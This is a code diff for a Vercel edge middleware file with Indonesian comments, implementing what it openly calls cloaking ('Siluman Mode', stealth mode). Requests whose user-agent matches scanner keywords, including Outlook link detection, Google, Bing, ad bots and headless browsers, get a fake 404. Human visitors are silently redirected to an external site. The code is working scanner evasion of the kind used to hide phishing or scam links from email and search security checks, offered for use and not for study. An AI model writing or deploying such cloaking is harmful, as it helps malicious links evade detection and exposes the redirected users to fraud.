@@ -1,29 +1,25 @@
-import { next } from '@vercel/edge';
-
 export const config = {
-  matcher: '/', // Menjalankan logika ini di halaman utama
+  matcher: '/', 
 };
 
 export default function middleware(req) {
-  const url = new URL(req.url);
   const ua = req.headers.get('user-agent')?.toLowerCase() || '';
 
-  // 1. Daftar Kata Kunci Bot Scanner (Outlook, Google, Bot Umum)
+  // Daftar kata kunci Bot Scanner
   const botKeywords = [
     'bot', 'spider', 'crawler', 'scanner', 'outlook-linkdetect', 
-    'preview', 'headless', 'googleusercontent', 'monit', 'slurp'
+    'preview', 'headless', 'googleusercontent', 'monit', 'slurp',
+    'lighthouse', 'bingbot', 'adsbot'
   ];
 
   const isBot = botKeywords.some(keyword => ua.includes(keyword));
 
-  // 2. LOGIKA CLOAKING
+  // 1. Jika terdeteksi Bot, kasih 404 (Siluman Mode)
   if (isBot) {
-    // JIKA BOT: Kirim halaman 404 palsu atau teks biasa (Sangat aman)
     return new Response('404 Not Found', { status: 404 });
   }
 
-  // 3. JIKA MANUSIA: Redirect Instan (307 Temporary Redirect)
-  // Ganti URL di bawah dengan web tujuanmu
+  // 2. Jika Manusia, Redirect Instan
   const targetUrl = 'https://nusaindahrp.com/?dev';
   
   return Response.redirect(targetUrl, 307);
